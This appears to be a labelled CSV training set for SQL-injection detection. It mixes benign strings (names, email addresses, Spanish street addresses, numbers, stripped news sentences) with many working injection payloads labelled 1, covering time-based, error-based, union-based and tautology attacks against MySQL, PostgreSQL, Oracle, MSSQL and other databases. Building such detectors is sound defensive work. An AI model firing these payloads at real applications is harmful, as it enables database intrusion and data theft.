Sentence,Label
batallanos halpin,0
"1'|| ( select 'ctgs' where 6809 = 6809 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""tvla"" = ""tvla",1
"1""  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( ""ddun"" = ""ddun",1
mullen@menorca.com.bf,0
1' )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'nxkp' like 'nxkp,1
donaciano,0
"1 and elt ( 1210 = 1210,sleep ( 5  )  )  -- ommf",1
tempest@quadernideilgarda.gg,0
ashla,0
g1o9er10,0
"1""  )  )   )  and sleep ( 5 ) #",1
grea,0
fisgar,0
1'|| ( select 'sdll' where 5074 = 5074 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu  )  )  ||',1
"1' )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 'iifh' = 'iifh",1
 They repeatedly missed passes attacks coming cleanly net Simon Schenk Eduard Schulz blocking game scratch ,0
yanil,0
"1%""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""%"" = """,1
"1"" )  as jidc where 6093 = 6093 and 9198 = 9198--",1
"1 where 8074 = 8074 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
"1""  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1' in boolean mode )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) #",1
 During course performance respective active scene illuminated ,0
"1 )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 9841 = 9841",1
castilblanco,0
leonard,0
ginard xabe,0
calle rafael bravo gomez 179 5?h,0
"1' union all select null,null,null,null#",1
"-2033"" )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
" Traditionally , anniversary celebration also always fitting occasion bestow honours ",0
5 percent C $ 4,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and ""azzv"" like ""azzv",1
 Bombardier said evaluating entry-into-service (EIS) schedule provide update next months ,0
"1""  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  ""aall"" like ""aall",1
"c/ salvatella, 98 11?h",0
ramadoss,0
"1%' union all select null,null,null,null,null,null,null,null,null,null#",1
"calle francisco gervas, 174, 9h",0
pueblica de valverde,0
46940,0
"1'  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  'ltym' = 'ltym",1
velasque9,0
0512154682216503,0
"1%'  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
diccico_pastor@ao09.io,0
morata de jiloca,0
-8922 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- krmh,1
pato,0
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and 'lgat' like 'lgat",1
" On 21 June , conjunction Schwarzwaldverein &#91; Black Forest Association &#93; Mid-Summer Festival , 12 July Arena , accompanied fireworks , 13 December first concert put Stadtmusik (Town Musical Society) new Festival Hall ",0
-7941 or  ( 5822 = 8754 ) *8754-- eepn,1
"calle bullaque, 46 10-f",0
scorziel,0
7840274194886704,0
bekki,0
"-9896""  )  )   )  union all select 4073,4073,4073,4073,4073#",1
56801763c,0
1 and 5934 = 7745,1
48549953n,0
"c/ rua mayor, 31, 1?e",0
 A departure Snowden Russia virtually impossible ,0
edeleman@mytanga.tr,0
"1%"" and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
da-1m1n,0
"1' )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'xikz' like 'xikz",1
"1'|| ( select 'qjwf' from dual where 3187 = 3187 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null  )  )  ||'",1
"llosa, la",0
particular basterra 108,0
09270,0
salva carol,0
9084625508674249,0
"1'  )  )   as uvxv where 6663 = 6663 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
valentianiano,0
santaniello_tabernero@enfuerteventura.com.ni,0
"1%'  )  )   or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
85amo,0
"campa zabala 184,",0
"1%'  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  '%' = '",1
19665853w,0
' or username like char ( 37 ) ;,1
"playa postiguet 81,",0
fater,0
" &quot; You &apos;re going get better deal , &quot; said ",0
3363230401310436,0
91220241x,0
 Tomorrow attempt train team ,0
 end ) +',1
"-8771""  )  )   union all select 6302,6302,6302,6302,6302#",1
"1' )  as mmhe where 2142 = 2142 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
" For 21 years , Georges Bwelle watched ill father slip consciousness , traveling hospitals &apos;t equipped help ",0
-8045  )  )   )  order by 1--,1
24596413y,0
"create or replace function sleep ( int )  returns int as '/lib/libc.so.6','sleep' language 'c' strict",1
c/ sagrada familia 176,0
"1"" )  as xwnu where 6490 = 6490 union all select null,null,null,null,null,null--",1
"1"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""zwov"" = ""zwov",1
0iri1a33,0
3553,0
aristin,0
tarasca,0
"15 , service St",0
6r_o733300e,0
8320,0
prell@davidymamen.tc,0
esmilcea,0
"1%""  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""%"" = """,1
34419,0
abadia@comercioenlacalle.er,0
salar,0
"-8040""  )  )   )  or make_set ( 3916 = 6787,6787 )  and   (  (   ( ""laar"" like ""laar",1
6180,0
7714749780417930,0
"1' )  where 2443 = 2443 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
"1"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""epxq"" like ""epxq",1
ivey,0
""" """,1
liebman6@maquillajeparalabios.va,0
44158492x,0
1%' )  and 7533 = 7533 and  ( '%' = ',1
lemoiz,0
?s,1
1'  )  )   )  waitfor delay '0:0:5'--,1
talarrubias,0
43785,0
-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,1
sabathiel,0
31049,0
toolbox,0
"praza madrid, 98, 4?d",0
mylong@deltamarina.aq,0
87853992h,0
17739088q,0
"1 )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ",1
 There currently 403 total orders commitments 15 customers operators ,0
"1"" )  union all select null,null,null,null,null,null,null,null,null#",1
 1 deadline set The Hague-based organization Damascus destroy &quot; render inoperable &quot; chemical weapon production facilities machinery mixing chemicals poison gas filling munitions ,0
katherina,0
torre val de san pedro,0
"c/ observatorio meteorologico retiro 70, 3?a",0
"-2896'  )  )   as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",1
1'+ ( select nsri where 1202 = 1202 and 4595 = 4595#,1
sertino,0
9423,0
25136,0
quintiliana,0
"1' and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and 'wytg' = 'wytg",1
22468230j,0
1813799559056744,0
nerpio,0
" select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
mir9136,0
" The eye placed one ray fall, might testify particular ray",0
romilda,0
"calle juan sitges 24,",0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( 3124 = 3124,1
kastner.matsuzaka@graficascamp.py,0
"juan vazquez, 112,",0
dalt,0
1'|| ( select 'brsr' where 5458 = 5458,1
sut5,0
roco@forohh.ge,0
-6912' in boolean mode )  union all select 6012--,1
" Maintenance day small &apos; Engländerhütte &apos; For fifth maintenance day follow-up Natura 2000 project Upper Hotzenwald , group dedicated participants met small Engländerhütte (Englishman &apos;s Cottage) Ibach Following suggestions population , valley area cottage cleared , said Mayor Helmut Kaiser ",0
 The conflict forced 2 million people flee country ,0
"1' )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( ""uydm"" = ""uydm",1
1 )  as fnpq where 5209 = 5209,1
1  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
dre,0
1 where 5359 = 5359 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
" Following short flight New York Boston , pupils arrived host families experiencing school day Weymouth High School ",0
5601692673189337,0
7008973356777544,0
garca fong,0
"1"" )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( ""fkmh"" = ""fkmh",1
sigenza,0
"1 )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 6986 = 6986",1
-6122'  )  )   )  or 9243 = 6161--,1
deolinda,0
limpi$aas,0
"waitfor delay '0:0:5' and ""%"" = """,1
retos9a1o,0
"1""  )  )   as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
"1 )  or elt ( 6272 = 6272,sleep ( 5  )  )  ",1
",@variable",1
"1  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  2939 = 2939",1
adam calao,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   ) +'",1
"1  )  )   as krzi where 8727 = 8727 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
esclisiado,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( 9069 = 9069,1
coca artero,0
herodes,0
7redil47ta,0
-8359 )  where 4430 = 4430 or 6872 = 6872--,1
99eja36r9a,0
a,1
1'  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( 'ujds' = 'ujds,1
2217,0
valentino,0
avril,0
chuck,0
"1'  )  )   )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (   ( 'nsji' = 'nsji",1
"1' in boolean mode )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",1
kepekci,0
monforte del cid,0
descarada,0
saqib,0
"1'  )  )   union all select null,null,null--",1
"1'|| ( select 'eayf' where 5431 = 5431 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null  )  )  ||'",1
"jesus jimenez, 86,",0
"san petersburgo, 165",0
" select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
1 )  as vqbf where 4020 = 4020,1
canino,0
varia,0
" Such growth pawn business ValueMax , operator outlet Bendemeer 15 others like Singapore , plans expand neighbouring Malaysia - four shops - outside Asia , says Yeah Lee Ching , ValueMax &apos;s executive director ",0
5a68i5ru9i2,0
1 where 7464 = 7464 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --,1
arrebatadizo,0
chiaoyun,0
"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) ",1
"1  )  )   as qfnu where 1609 = 1609 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
 Baroness Kramer said: &quot; Our goal HS2 truly national network bring UK cities closer together ,0
88253355d,0
de tena leguizamn,0
8225299412218383,0
brooking-doolittle@encuentrodominios.lv,0
92624028s,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( ""%"" = """,1
gavald,0
1'+ ( select ijoh where 7145 = 7145 order by 1--,1
" Mr Kerry insisted , however , NSA force good surveillance operations saved many lives ",0
filantrpica,0
"1'+ ( select 'asdq' where 4023 = 4023 and make_set ( 8403 = 8403,8899  )  )  +'",1
"1"" where 7599 = 7599",1
"1"" )  as wvxt where 7321 = 7321 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
regaladam_ente,0
"toril, 171 5h",0
1 )  where 2170 = 2170,1
ping.kasatsu@asdn.cl,0
1' and  ( 3020 = 3020 ) *6703 and 'tmng' like 'tmng,1
24324,0
1 where 4091 = 4091,1
sa6v682ia,0
"1' )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( 'ggiw' = 'ggiw",1
anariva estradera,0
kedah,0
terroba,0
6246,0
select pg_sleep ( 5 ) ,1
 &quot; We driving forward HS2 benefits bring huge ,0
azorin 35 1b,0
select  ( case when  ( 1407 = 2741 )  then 1407 else 1407* ( select 1407 from mysql.db )  end ) #,1
co65025,0
4107,0
m_at1i852se,0
grace,0
"1""  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  ""afby"" = ""afby",1
revelante,0
gossett@conac.com.li,0
kimberle,0
15885803w,0
-4572' )  union all select 3520--,1
sar2384g0,0
 I &apos;ve realised wrongdoing ,0
7058252446193830,0
telsfora,0
"1"" )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( ""ccuy"" = ""ccuy",1
admin' )  or  ( '1' = '1'#,1
wilfrid,0
56163821y,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 9646 = 9646",1
71319387k,0
skedelsk,0
ozoa cadaveira,0
"-9432  )  )   as nqya where 8387 = 8387 or elt ( 9242 = 6180,6180 ) --",1
1 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  -- yczq,1
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1
"1"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""xsfg"" like ""xsfg",1
inciertamente,0
clodomiro,0
-2992%'  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( '%' = ',1
des-enartar,0
ermanno,0
1 )  as usnn where 3201 = 3201,1
1' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and 'lqsa' like 'lqsa,1
2591,0
 &quot; Perry one singers make guest appearance Rolling Stones &apos; tour year ,0
7ar82fa,0
34,0
ambiental,0
calaceite,0
1'+ ( select mfcd where 6757 = 6757 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) +',1
85981189j,0
1 where 5700 = 5700,1
laureano,0
"-9881""  )  )   or 9850 = 8118#",1
09246,0
sobrecejo,0
"1""  )  )   as gprr where 5975 = 5975 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
"1""  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""bizm"" = ""bizm",1
"-1432""  )  )   union all select 9008,9008,9008#",1
 It amazing get back arms ,0
bonifacio,0
ensminge,0
lewwis.mall@epbx.pg,0
"1""  )  )   )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( ""msjh"" like ""msjh",1
"ronda bellesguard 125, 11?c",0
dec7moquin3o,0
1008,0
leandro,0
"1' )  where 7007 = 7007 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"-3442' in boolean mode )  union all select 6255,6255,6255,6255,6255#",1
37188,0
" He said NotW used three ways investigate stories: phone hacking , surveillance , confrontation ",0
galdino,0
cgi 1051 1054 106 107 1071 1079 108 108,0
bollullos de la mitacin,0
" In ladies &apos; race , Christiane Cohsmann achieved fastest time main race ",0
"calle pea 49, 9?b",0
8877423403591607,0
veit,0
yescas feal,0
"-3037 )  where 9024 = 9024 union all select 9024,9024--",1
1'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
" Two people injured resulting fire spread smoke , however , one able make emergency call ",0
1%' and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and '%' = ',1
ors,0
30591115b,0
"1""  )  )   as vbdo where 3882 = 3882",1
select  ( case when  ( 9746 = 8055 )  then 9746 else 1/ ( select 0 )  end ) --,1
29967631b,0
1 )  as hhly where 2906 = 2906,1
83288994z,0
tarrats steiert,0
"1"" )  as kzuq where 4259 = 4259",1
‘ or 1 = 1 --,1
"1%"" union all select null,null,null,null,null,null,null--",1
1'|| ( select 'lnhq' where 7526 = 7526,1
"cuesta pizarro 12, 4?d",0
jorba bastardes,0
"1'  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'qvqf' = 'qvqf",1
yeladaky janeiro,0
4474255756033041,0
1%' )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( '%' = ',1
4354c07a,0
spruance@maquillajeparalabios.ro,0
"1%"" )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""%"" = """,1
"1 )  as tkkn where 7832 = 7832  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --",1
agres,0
longoria aro,0
"1"" and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1
duljit,0
"1%"" )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and  ( ""%"" = """,1
lamas,0
' or userid like '%,1
1 )  as xtgr where 1545 = 1545,1
"1"" )  as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
10335,0
cabrillas,0
2201361868011064,0
1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5  )  )  ||',1
pastelear,0
struchkova@gestionsoftware.cl,0
" &quot; Our current policy electronic devices cannot used take-off landing immediate plans change , &quot; said ",0
jabbari,0
1 waitfor delay '0:0:5',1
16648,0
" When year comes end eight weeks , anniversary year upon us ",0
cami del fredolic 115,0
bartol basco,0
hall,0
25260,0
1'  )  )   and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (  'jryo' = 'jryo,1
"1%'  )  )   )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( '%' = '",1
-1396 where 5838 = 5838 or 9323 = 9323#,1
"1'|| ( select 'hfbt' where 7204 = 7204 union all select null,null,null,null,null,null,null,null,null,null--",1
mercantesca,0
palacios de la fe,0
"-5032' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
16842,0
marston.mannkopf@sigloventidos.al,0
augur,0
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1
gu9s8na,0
solosancho,0
cus motj,0
"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666  )  )  +'",1
-2174'  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  'dyyg' = 'dyyg,1
ramsey,0
" ( select 1 from generate_series ( 8515,8515,case when  ( 8515 = 3477 )  then 1 else 0 end )  limit 1 ) ",1
0861204544361308,0
 or 'whatever' in  ( 'whatever' ) ,1
44368,0
4761077405436088,0
23978164c,0
0390750196070955,0
6264,0
7529,0
horst@engibraltar.com.co,0
"1'  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and 'aicu' = 'aicu",1
badger,0
" select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
ribadumia,0
"1"" where 8016 = 8016",1
fisas,0
" select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1
"select count ( * )  from generate_series ( 1,5000000 )  and  ( 'cewn' = 'cewn",1
" select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1",1
antai,0
43896,0
47628834c,0
"1'  )  )   or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  'ozan' = 'ozan",1
"calle tajo, 182,",0
20976629p,0
6733674859620328,0
gimialcn,0
"1' )  where 2775 = 2775 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
1' )  and  ( 3020 = 3020 ) *6703,1
1'+ ( select 'wyxu' where 2555 = 2555 union all select null#,1
7194366755548544,0
 It said decided &quot; impose administrative penalty Chen Yongzhou revoking reporter &apos;s license ,0
22311,0
" And little decade ago , medical community thought gender slate could erased redrawn ",0
 German media say BfV hoped identify presence listening antennas action prompted exchange US German foreign ministry Berlin ,0
"-6642' )  where 3459 = 3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",1
soriguera,0
ficker,0
1wwis,1
"1%""  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""%"" = """,1
"calle manzanilla 141,",0
8833519281549056,0
"1"" )  where 4112 = 4112",1
3274173205988985,0
"1'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( 'ujcx' = 'ujcx",1
danis,0
 Passengers buy tickets airline &apos;s website &apos;t pay ,0
"-7531'  )  )   )  union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1
" How important Yahoo Google within e-mail market Germany ? According study conducted Convios Consulting August 2013 , among main mail services private use , Yahoo Google play minor role ",0
" Else, to-morrow stranger say masterly good sense precisely thought felt time, shall forced take shame opinion another",0
"quintana 19, 13f",0
hirotaka,0
em8a2t118r,0
11295198j,0
pelayo,0
"1'|| ( select 'pnsw' where 2103 = 2103 union all select null,null,null,null,null,null,null,null--",1
"1'  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'qgov' = 'qgov",1
07441681p,0
prouty@gnuez.zw,0
alguer murillo,0
357rte0o,0
1%'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  '%' = ',1
" select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1
mcnerlan,0
469,0
 ( ||6 ) ,1
" He suffered broken arm first , infection developed spread brain , creating hematoma would affect rest life ",0
ruidera,0
"1""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""ipqw"" like ""ipqw",1
"c/ el cedro s/n, 2-c",0
